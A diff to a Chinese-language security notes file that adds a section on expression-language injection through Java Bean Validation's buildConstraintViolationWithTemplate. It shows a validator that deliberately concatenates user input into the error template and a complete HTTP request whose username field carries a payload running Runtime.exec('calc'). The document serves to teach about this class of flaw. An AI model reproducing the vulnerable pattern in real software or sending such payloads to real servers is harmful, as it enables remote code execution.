@@ -143,6 +143,76 @@ public void velocity(String template) {
     Velocity.evaluate(context, swOut, "test", template);
 }
 ```
+## ConstraintValidatorContext.buildConstraintViolationWithTemplate
+实体User类
+```java
+public class User implements Serializable {
+    @UserValidator
+    private String username;
+    private String password;
+    private String id;
+}
+```
+UserCheck类
+```java
+public class UserCheck implements ConstraintValidator<UserValidator, String> {
+    private static final Pattern mail_pattern = Pattern.compile("^\\s*\\w+(?:\\.{0,1}[\\w-]+)*@[a-zA-Z0-9]+(?:[-.][a-zA-Z0-9]+)*\\.[a-zA-Z]+\\s*$");
+    public boolean isValid(String mail, ConstraintValidatorContext constraintValidatorContext) {
+        if (StringUtils.isEmpty(mail))
+            return false;
+        Matcher m = mail_pattern.matcher(mail);
+        if (m.matches())
+            return true;
+        constraintValidatorContext.disableDefaultConstraintViolation();
+        //错误的将用户输入的信息带入构建模板中，导致SPEL表达式的注入。
+        constraintValidatorContext.buildConstraintViolationWithTemplate("mail not exist: " + mail).addConstraintViolation();
+        return false;
+    }
+
+    public void initialize(UserValidator constraintAnnotation) {}
+}
+```
+UserValidator类
+```java
+import javax.validation.Constraint;
+import javax.validation.Payload;
+import java.lang.annotation.ElementType;
+import java.lang.annotation.Retention;
+import java.lang.annotation.RetentionPolicy;
+import java.lang.annotation.Target;
+
+@Target({ElementType.METHOD, ElementType.FIELD, ElementType.ANNOTATION_TYPE, ElementType.CONSTRUCTOR, ElementType.PARAMETER})
+@Retention(RetentionPolicy.RUNTIME)
+@Constraint(validatedBy = {UserCheck.class})
+public @interface UserValidator {
+    String message() default "error user";
+
+    Class<?>[] groups() default {};
+
+    Class<? extends Payload>[] payload() default {};
+}
+```
+```java
+@PostMapping({"/signup"})
+public String signupPost(@Valid @ModelAttribute("user") User user, BindingResult bindingResult, Model model) {
+    if (bindingResult.hasErrors()) {
+        model.addAttribute("erroremail", Boolean.valueOf(true));
+        return "signup";
+    }
+    return "redirect:/";
+}
+```
+SPEL执行命令：
+```
+POST /valid/signup HTTP/1.1
+Host: www.test.com:8080
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 185
+
+username=${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('calc')")}&password=123&id=121
+```
 # SPEL Payload
 ## 常见payload
 ```java
